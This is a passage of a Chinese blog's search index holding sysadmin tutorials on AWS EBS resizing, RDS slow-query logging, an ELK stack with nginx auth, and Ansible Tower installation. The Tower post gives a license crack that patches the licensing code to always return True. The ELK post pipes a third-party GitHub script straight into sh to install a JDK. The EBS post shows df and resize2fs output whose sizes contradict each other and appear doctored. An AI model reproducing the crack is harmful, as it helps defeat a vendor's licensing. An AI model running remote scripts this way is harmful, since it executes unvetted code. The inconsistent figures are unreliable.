class="line">&#125;</div></pre></div></div></figure><blockquote><p>./themes/next/source/css/_custom/custom.styl <code>修改</code></p></blockquote><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">...</div><div class="line">@import button;</div></pre></div></div></figure><p>添加代码拉伸控制button文件<img src="https://kionf.com/article_images/png/Pin_green.png" alt="green"><img src="https://kionf.com/article_images/png/Pin_red.png" alt="red"></p><hr><p>剩下的自己鼓捣</p><div class="note success"><p><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html" title="神器" target="_blank" rel="noopener">神器</a></p></div>]]></content>
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> next </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>AWS EC2 磁盘EBS扩容</title>
      <link href="/2017/11/15/linux-aws-ebs/"/>
      <url>/2017/11/15/linux-aws-ebs/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>5min不停机扩容EBS卷大小</p></blockquote><a id="more"></a><h1 id="0x00-增加磁盘大小"><a href="#0x00-增加磁盘大小" class="headerlink" title="0x00 增加磁盘大小"></a>0x00 增加磁盘大小</h1><h2 id="1-在ec2实例界面选择相应需要扩容磁盘的实例，选择要扩容的磁盘"><a href="#1-在ec2实例界面选择相应需要扩容磁盘的实例，选择要扩容的磁盘" class="headerlink" title="1. 在ec2实例界面选择相应需要扩容磁盘的实例，选择要扩容的磁盘"></a>1. 在ec2实例界面选择相应需要扩容磁盘的实例，选择要扩容的磁盘</h2><p><img src="https://kionf.com/article_images/aws-ebs/aws-ebs-1.png" alt="kionf"></p><p><img src="https://kionf.com/article_images/aws-ebs/aws-ebs-2.png" alt="kionf"></p><h2 id="2-修改卷大小"><a href="#2-修改卷大小" class="headerlink" title="2. 修改卷大小"></a>2. 修改卷大小</h2><p><img src="https://kionf.com/article_images/aws-ebs/aws-ebs-3.png" alt="kionf">    </p><p><img src="https://kionf.com/article_images/aws-ebs/aws-ebs-4.png" alt="kionf">    </p><h2 id="3-确认"><a href="#3-确认" class="headerlink" title="3. 确认"></a>3. 确认</h2><p>显示进度，等待应用配置完成，需要几分钟耐心等待….</p><p><img src="https://kionf.com/article_images/aws-ebs/aws-ebs-5.png" alt="kionf">    </p><h1 id="0x01-扩容磁盘"><a href="#0x01-扩容磁盘" class="headerlink" title="0x01 扩容磁盘"></a>0x01 扩容磁盘</h1><p><strong>安装扩容工具</strong></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">yum install cloud-init cloud-utils-growpart gdisk</div></pre></div></div></figure><p>等待ebs卷大小调整完成后，在扩容的实例中执行lsblk列出连接到实例的EBS设备</p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">[root@ttt] #: lsblk</div><div class="line">NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT</div><div class="line">xvda    202:0    0  6000G  0 disk </div><div class="line">└─xvda1 202:1    0  20G  0 part /</div></pre></div></div></figure><p>使用 df -h 查看，/dev/xvda1 设备已扩展为 6000 GiB，但操作系统仍只能看到原来的 20 GiB ext4 文件系统</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">[root@ttt] <span class="comment">#: df -h</span></div><div class="line">文件系统                       容量  已用  可用 已用% 挂载点</div><div class="line">devtmpfs                       3.9G   64K  3.9G    1% /dev</div><div class="line">tmpfs                          3.9G     0  3.9G    0% /dev/shm</div><div class="line">/dev/xvda1                      20G   12G  8.2G   59% /</div></pre></div></div></figure><p>接下来使用<code>growpart</code>展开修改后的分区<strong>（注意将设备名称与分区名称分隔开）</strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">[root@ttt] <span class="comment">#: growpart /dev/xvda 1</span></div><div class="line">CHANGED: disk=/dev/xvda partition=1: start=4096 old: size=41938910,end=41943006 new: size=104853470,end=104857566</div></pre></div></div></figure><p>通过查看<code>lsblk</code>可以确认分区<code>/dev/xvda1</code>现已填充卷<code>/dev/xvda</code>上的可用空间：</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">[root@ttt] <span class="comment">#: lsblk</span></div><div class="line">NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT</div><div class="line">xvda    202:0    0  6000G  0 disk </div><div class="line">└─xvda1 202:1    0  6000G  0 part /</div></pre></div></div></figure><p>对于 Linux ext2、ext3 或 ext4 文件系统，使用以下命令并替换要扩展的设备名称：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">[root@ttt] #: resize2fs /dev/xvda1</div><div class="line">resize2fs 1.42.12 (29-Aug-2014)</div><div class="line">Filesystem at /dev/xvda1 is mounted on /; on-line resizing required</div><div class="line">old_desc_blocks = 2, new_desc_blocks = 4</div><div class="line">The filesystem on /dev/xvda1 is now 13106683 (4k) blocks long.</div></pre></div></div></figure><h1 id="0x02-完成扩容"><a href="#0x02-完成扩容" class="headerlink" title="0x02 完成扩容"></a>0x02 完成扩容</h1><p>至此，磁盘已完成扩容，查看磁盘可用空间：</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">[root@ttt] <span class="comment">#: df -h</span></div><div class="line">文件系统                       容量  已用  可用 已用% 挂载点</div><div class="line">devtmpfs                       3.9G   64K  3.9G    1% /dev</div><div class="line">tmpfs                          3.9G     0  3.9G    0% /dev/shm</div><div class="line">/dev/xvda1                      6000G   12G  5988.2G   0.002% /</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> 自动化运维 </category>
          
          <category> AWS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>aws上RDS数据库开启慢查询日志</title>
      <link href="/2017/11/08/mysql-slowlog/"/>
      <url>/2017/11/08/mysql-slowlog/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>mysql数据库开启慢查询日志和查询中没索引的语句。供分析</p></blockquote><a id="more"></a><h1 id="0x00参数"><a href="#0x00参数" class="headerlink" title="0x00参数"></a>0x00参数</h1><p>首先选择<code>RDS服务</code>&gt;<code>参数组</code>选择需要更改的参数组更改如下参数:</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line">- slow_query_log：要创建慢速查询日志，请设置为 1。默认值为 0。</div><div class="line"></div><div class="line">- general_log：要创建一般日志，请设置为 1。默认值为 0。</div><div class="line"></div><div class="line">- long_query_time：只记录查询时间超过制定时间的sql。例long_query_time=0.5只记录查询时间超过500毫秒的sql。</div><div class="line"></div><div class="line">- log_queries_not_using_indexes：要将所有不使用索引的查询记录到慢速查询日志，请设置为 1。默认值为 0。即使查询的执行时间小于 long_query_time 参数值，只要它们不使用索引，就会被系统记录。</div><div class="line"></div><div class="line">- log_output：您可为 log_output 参数指定下列选项之一。</div><div class="line">TABLE (默认) – 将一般查询写入 mysql.general_log 表，将慢速查询写入 mysql.slow_log 表。</div><div class="line">FILE  (推荐) – 将一般查询日志和慢速查询日志写入文件系统。日志文件每小时轮换一次。</div><div class="line">NONE– 禁用日志记录。</div></pre></div></div></figure><p>启用了日志记录时，Amazon RDS 会定期轮换表日志或删除日志文件，log_output为TABLE时如需手动轮换执行：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">PROMPT&gt; CALL mysql.rds_rotate_slow_log;</div><div class="line">PROMPT&gt; CALL mysql.rds_rotate_general_log;</div></pre></div></div></figure><p><code>log_output</code>为<code>FILE</code>时会每小时检查日志文件并删除 24 小时之前的日志文件。</p><h1 id="0x01实际应用参数"><a href="#0x01实际应用参数" class="headerlink" title="0x01实际应用参数"></a>0x01实际应用参数</h1><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">slow_query_log=1</div><div class="line">general_log=1</div><div class="line">long_query_time=0.5</div><div class="line">log_queries_not_using_indexes=1</div><div class="line">log_output=FILE</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>log4j-1.2 + ELK部署</title>
      <link href="/2017/09/18/elk-deploy/"/>
      <url>/2017/09/18/elk-deploy/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p><img src="https://kionf.com/article_images/kibana-dash.png" alt="kionf"></p><p>log4j-1.2 + logstash-5.0.1 + elasticsearch-5.6.0 + kibana-5.6.0</p></blockquote><a id="more"></a><h1 id="0x00-下载ELK"><a href="#0x00-下载ELK" class="headerlink" title="0x00 下载ELK"></a>0x00 下载ELK</h1><p>下载 ：</p><p>1) <a href="https://artifacts.elastic.co/downloads/logstash/logstash-5.0.1.tar.gz" title="logstash" target="_blank" rel="noopener">logstash-5.0.1</a><br>2) <a href="https://artifacts.elastic.co/downloads/kibana/kibana-5.6.0-linux-x86_64.tar.gz" title="kibana" target="_blank" rel="noopener">kibana-5.6.0</a><br>3) <a href="https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.6.0.tar.gz" title="elasticsearch-5.6.0" target="_blank" rel="noopener">elasticsearch-5.6.0</a><br>4) <a href="http://mirrors.linuxeye.com/jdk/jdk-8u112-linux-x64.tar.gz" title="jdk1.8" target="_blank" rel="noopener">安装jdk1.8</a> <code>curl https://raw.githubusercontent.com/kalivim/Linux_shell/master/jdk-1.8.112.sh|sh</code></p><p>下载完成后解压相应文件,脚本安装jdk在/data/software/下</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">export JAVA_HOME=/data/jdk1.8.0_112</div><div class="line">export PATH=$JAVA_HOME/bin:$PATH</div><div class="line">export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</div></pre></div></div></figure><h1 id="0x01-配置log4j"><a href="#0x01-配置log4j" class="headerlink" title="0x01 配置log4j"></a>0x01 配置log4j</h1><p>首先配置程序log4j配置文件<code>log4j.properties</code>,添加如下配置</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">#在rootLogger中添加logstash</div><div class="line">log4j.rootLogger=info,all,logstash</div><div class="line"></div><div class="line">#logstach</div><div class="line">log4j.appender.logstash=org.apache.log4j.net.SocketAppender</div><div class="line">#logstash监听端口，默认4560</div><div class="line">log4j.appender.logstash.Port=4560</div><div class="line">#logstash主机ip/host</div><div class="line">log4j.appender.logstash.RemoteHost=ops</div><div class="line">log4j.appender.logstash.ReconnectionDelay=60000</div><div class="line">log4j.appender.logstash.LocationInfo=true</div></pre></div></div></figure><h1 id="0x02-配置logstash"><a href="#0x02-配置logstash" class="headerlink" title="0x02 配置logstash"></a>0x02 配置logstash</h1><p>编辑配置文件，log4j.cfg</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></div><div class="code"><pre><div class="line">vim logstash-5.0.1/log4j.cfg</div><div class="line"></div><div class="line">#内容</div><div class="line"></div><div class="line">input &#123;</div><div class="line">log4j &#123;</div><div class="line">host =&gt; &quot;172.16.0.12&quot;</div><div class="line">#监听地址</div><div class="line">port =&gt; 4560</div><div class="line">#监听端口</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">filter &#123;</div><div class="line">#过滤错误类型删除掉INFO类型错误</div><div class="line">if [priority] == &quot;INFO&quot; &#123;</div><div class="line">drop &#123;&#125;</div><div class="line">&#125; #else if [method] == &quot;checkSqlShardName&quot; &#123;</div><div class="line">#drop &#123;&#125;</div><div class="line">#&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">output &#123;</div><div class="line">#输出到控制台（调试）</div><div class="line">stdout &#123;</div><div class="line">codec =&gt; rubydebug</div><div class="line">&#125;</div><div class="line"></div><div class="line">elasticsearch &#123;</div><div class="line">hosts =&gt; [&quot;127.0.0.1:9200&quot;]</div><div class="line">#elasticsearch地址</div><div class="line">index =&gt; &quot;game-%&#123;+YYYY.MM.dd&#125;&quot;</div><div class="line">#建立索引</div><div class="line">flush_size =&gt; 1000</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></div></div></figure><div class="note danger"><p><strong>注意这里有一个小bug,在<code>input</code>中使用<code>log4j</code>接收不到日志，使用<code>tcp</code>可以接收。这里需要改下logstash源码文件</strong></p><p><code>vim logstash-core/lib/jars.rb</code></p><p>注释掉第二行<code>#require_jar(&#39;org.apache.logging.log4j&#39;, &#39;log4j-1.2-api&#39;, &#39;2.6.2&#39;)</code></p></div><p><strong>注 ：</strong>可以把<code>output</code>中的<code>elasticsearch</code>，注释掉，启动java程序测试下logstash控制台中是否输出日志，调试启动<code>./bin/logstash -f log4j.cfg</code></p><h1 id="0x03-配置elasticsearch"><a href="#0x03-配置elasticsearch" class="headerlink" title="0x03 配置elasticsearch"></a>0x03 配置elasticsearch</h1><p>root直接启动 elasticsearch 报错如下</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></div><div class="code"><pre><div class="line">[2017-09-18T08:51:35,959][WARN ][o.e.b.ElasticsearchUncaughtExceptionHandler] [] uncaught exception in thread [main]</div><div class="line">org.elasticsearch.bootstrap.StartupException: java.lang.RuntimeException: can not run elasticsearch as root</div><div class="line">at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:136) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:123) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:67) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.cli.Command.main(Command.java:90) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:91) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:84) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">Caused by: java.lang.RuntimeException: can not run elasticsearch as root</div><div class="line">at org.elasticsearch.bootstrap.Bootstrap.initializeNatives(Bootstrap.java:106) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:195) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:342) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:132) ~[elasticsearch-5.6.0.jar:5.6.0]</div><div class="line">... 6 more</div></pre></div></div></figure><p>elasticsearch不允许root用户运行，首先创建普通用户，设置权限</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">useradd elk</div><div class="line"></div><div class="line">chown -R elk:elk ./elasticsearch-5.6.0</div></pre></div></div></figure><blockquote><p>配置文件<code>config/elasticsearch.yml</code>第55行和59行是监听地址和端口，<code>config/jvm.options</code>jvm内存配置文件，根据需求配置</p></blockquote><p>切换到普通用户elk启动elasticsearch</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">su - elk</div><div class="line">cd /data/elk/elasticsearch-5.6.0</div><div class="line">./bin/elasticsearch -d</div><div class="line">#-d选项后台运行</div></pre></div></div></figure><h1 id="0x04-配置nginx加固kibana安全"><a href="#0x04-配置nginx加固kibana安全" class="headerlink" title="0x04 配置nginx加固kibana安全"></a>0x04 配置nginx加固kibana安全</h1><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></div><div class="code"><pre><div class="line"></div><div class="line">server &#123;</div><div class="line">listen8000;</div><div class="line">server_namelocalhost;</div><div class="line">auth_basic&quot;ELK Log Auth&quot;;</div><div class="line">#密码文件</div><div class="line">auth_basic_user_file /data/nginx/kibana.passwd;</div><div class="line"></div><div class="line">#配置ssl</div><div class="line">sslon;</div><div class="line">ssl_certificate/data/nginx/all.crt;</div><div class="line">ssl_certificate_key/data/nginx/server.key;</div><div class="line"></div><div class="line"></div><div class="line">location / &#123;</div><div class="line">proxy_pass http://127.0.0.1:5601;</div><div class="line">proxy_redirect off;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></div></div></figure><h2 id="1-生成nginx认证文件"><a href="#1-生成nginx认证文件" class="headerlink" title="1. 生成nginx认证文件"></a>1. 生成nginx认证文件</h2><p>如果提示没用htpasswd就装个apache,根据提示输入两次密码就ok</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">htpasswd  -c /data/nginx/kibana.passwd username</div><div class="line">#&gt; New password: </div><div class="line">#&gt; Re-type new password: </div><div class="line">#&gt; Adding password for user username</div></pre></div></div></figure><h2 id="2-生成ssl证书"><a href="#2-生成ssl证书" class="headerlink" title="2. 生成ssl证书"></a>2. 生成ssl证书</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">openssl genrsa -des3 -out server.key 1024</div><div class="line">openssl rsa -in server.key -out server1.key</div><div class="line">openssl req -new -key server1.key -out all.csr</div><div class="line">#会提示让输入各种信息，最后会让输入密码，如果设置启动nginx会让输入密码。</div><div class="line">openssl x509 -req -days 365 -in all.csr -signkey server1.key -out all.crt</div></pre></div></div></figure><h2 id="3-启动nginx"><a href="#3-启动nginx" class="headerlink" title="3. 启动nginx"></a>3. 启动nginx</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">./sbin/nginx</div></pre></div></div></figure><h1 id="0x05-启动elk"><a href="#0x05-启动elk" class="headerlink" title="0x05 启动elk"></a>0x05 启动elk</h1><p>使用<code>screen</code> 启动kibana、logstash</p><p>启动logstash：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line">#创建名为logstash的screen后台进程</div><div class="line">screen -dmS logstash</div><div class="line"></div><div class="line">#查看screen进程</div><div class="line">screen -ls</div><div class="line">There are screens on:</div><div class="line">19654.logstash(Detached)</div><div class="line"></div><div class="line">#进入会话</div><div class="line">screen -r logstash</div><div class="line"></div><div class="line">#启动logstash</div><div class="line">cd /data/elk/logstash-5.0.1</div><div class="line">./bin/logstash -f log4j.cfg</div><div class="line"></div><div class="line">#后台运行</div><div class="line">Ctrl + a  d</div></pre></div></div></figure><p>启动kibana：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">screen -dmS kibana</div><div class="line">screen -r kibana</div><div class="line">cd /data/elk/kibana-5.6.0-linux-x86_64</div><div class="line">./bin/kibana</div><div class="line">Ctrl + a + d</div></pre></div></div></figure><p>kibana添加索引<code>game-</code>（在logstash配置文件中）</p><p><img src="https://kionf.com/article_images/kibana-add.png" alt="kionf"></p><p>自定义Visualize，显示到dashboard</p><p><img src="https://kionf.com/article_images/kibana-dash.png" alt="kionf"></p><h1 id="0x06-这只是开始。。。。"><a href="#0x06-这只是开始。。。。" class="headerlink" title="0x06 这只是开始。。。。"></a>0x06 这只是开始。。。。</h1><p><a href="https://kibana.logstash.es/content/" title="进门" target="_blank" rel="noopener">进门</a><br><a href="https://www.elastic.co/guide/index.html" title="摸爬滚打" target="_blank" rel="noopener">摸爬滚打</a></p>]]></content>
      
      <categories>
          
          <category> 自动化运维 </category>
          
          <category> ELK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ansible-Tower部署and破解</title>
      <link href="/2017/07/24/linux-tower/"/>
      <url>/2017/07/24/linux-tower/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/tower/tower-dashboard.png" alt="kionf"></p><blockquote class="blockquote-center"><p><code>ansibke-tower</code>他是一个图形化的任务调度，复杂服务部署，IT自动化的一个管理平台。可以通过界面从github拉取最新playbook实施服务部署，提高生产效率。当然，它也提供一个RESET API和命令行的CLI以供python脚本调用。</p></blockquote><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><a href="https://www.ansible.com/tower" title="ansible-tower" target="_blank" rel="noopener">ansible-tower</a>关于此类的文章比较少，踩过坑，16年那会儿有听过就装上研究了一发，现在做个迟来的笔记， 包括部署，和免费版10台机器限制的破解。</p><div class="note warning"><p>支持的操作系统：</p><ul><li>Red Hat Enterprise Linux 7.2 or later 64-bit</li><li>CentOS 7.2 or later 64-bit</li><li>Ubuntu 14.04 LTS 64-bit</li><li>Ubuntu 16.04 LTS 64-bit</li></ul><p>推荐最低内存为2GB。</p></div><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>整个申请流程也是麻烦的很，尤其是申请免费license。这里直接给出官网下载链接<a href="http://releases.ansible.com/ansible-tower/setup/" title="Ansible-Tower" target="_blank" rel="noopener">Ansible-Tower</a></p><p>这里使用的是最新版(3.1.4)</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">wget http://releases.ansible.com/ansible-tower/setup/ansible-tower-setup-latest.tar.gz -P /data/tower/</div><div class="line"></div><div class="line"><span class="built_in">cd</span> /data/tower/</div><div class="line"></div><div class="line">tar xvf ansible-tower-setup-latest.tar.gz -C ./</div><div class="line"></div><div class="line"><span class="built_in">cd</span> ansible-tower-setup-3.1.4/</div></pre></div></div></figure><p>目录结构，安装非常简单，这也要得益于ansible的playbook。</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line">[root@ad0e6b9ef8d5 ansible-tower-setup-3.1.4]# ll</div><div class="line">total 60</div><div class="line">-rw-r--r--.  1 root root  2526 Jul 10 13:59 README.md</div><div class="line">-rw-r--r--.  1 root root   129 Jul 10 13:59 backup.yml</div><div class="line">drwxr-xr-x.  2 root root  4096 Jul 10 13:59 group_vars</div><div class="line">-rw-r--r--.  1 root root    10 Jul 25 03:03 install.retry</div><div class="line">-rw-r--r--.  1 root root  5571 Jul 10 13:59 install.yml</div><div class="line">-rw-r--r--.  1 root root   379 Jul 25 03:03 inventory</div><div class="line">drwxr-xr-x.  2 root root 12288 Jul 10 13:59 licenses</div><div class="line">-rw-r--r--.  1 root root   944 Jul 10 13:59 restore.yml</div><div class="line">drwxr-xr-x. 18 root root  4096 Jul 10 13:59 roles</div><div class="line">-rwxr-xr-x.  1 root root  9628 Jul 10 13:59 setup.sh</div></pre></div></div></figure><p>编辑<strong>inventory</strong>配置文件如下</p><p><code>vim inventory</code></p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></div><div class="code"><pre><div class="line">[tower]</div><div class="line">localhost ansible_connection=local</div><div class="line"></div><div class="line">[database]</div><div class="line"></div><div class="line">[all:vars]</div><div class="line">#ansible-tower登录密码</div><div class="line diff-deletion">admin_password='admin'</div><div class="line"></div><div class="line">#PostgreSQL监听地址端口</div><div class="line">pg_host='127.0.0.1'</div><div class="line">pg_port='5432'</div><div class="line"></div><div class="line">pg_database='awx'</div><div class="line">pg_username='awx'</div><div class="line">#here</div><div class="line">pg_password='awx'</div><div class="line"></div><div class="line">rabbitmq_port=5672</div><div class="line">rabbitmq_vhost=tower</div><div class="line">rabbitmq_username=tower</div><div class="line">#here</div><div class="line">rabbitmq_password='tower'</div><div class="line">rabbitmq_cookie=cookiemonster</div><div class="line"></div><div class="line"># Needs to be true for fqdns and ip addresses</div><div class="line">rabbitmq_use_long_name=false</div></pre></div></div></figure><p>运行安装脚本</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sh setup.sh</div></pre></div></div></figure><p>脚本会自动安装，熟悉的执行playbook任务界面。</p><p>安装成功</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">localhost                  : ok=41   changed=5    unreachable=0    failed=0</div></pre></div></div></figure><h1 id="0x02导入license文件"><a href="#0x02导入license文件" class="headerlink" title="0x02导入license文件"></a>0x02导入license文件</h1><div class="note danger"><p><strong>注意从3.2.x版本开始ansible-tower破解方式更改，无需申请license文件 </strong></p></div><p>更改文件<code>/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.py</code>第120行如下</p><figure class="highlight python"><div class="figcode"><div class="code"><pre><div class="line"><span class="number">119</span>     <span class="function"><span class="keyword">def</span> <span class="title">_check_cloudforms_subscription</span><span class="params">(self)</span>:</span></div><div class="line diff-addition"><span class="number">120</span>         <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"><span class="number">121</span>         <span class="keyword">if</span> os.path.isdir(<span class="string">"/opt/rh/cfme-appliance"</span>) <span class="keyword">and</span> os.path.isdir(<span class="string">"/opt/rh/cfme-gemset"</span>):</div><div class="line"><span class="number">122</span>             <span class="keyword">try</span>:</div><div class="line"><span class="number">123</span>                 has_rpms = subprocess.call([<span class="string">"rpm"</span>, <span class="string">"--quiet"</span>, <span class="string">"-q"</span>, <span class="string">"cfme"</span>, <span class="string">"cfme-appliance"</span>, <span class="string">"cfme-gemset"</span>])</div><div class="line"><span class="number">124</span>                 <span class="keyword">if</span> has_rpms == <span 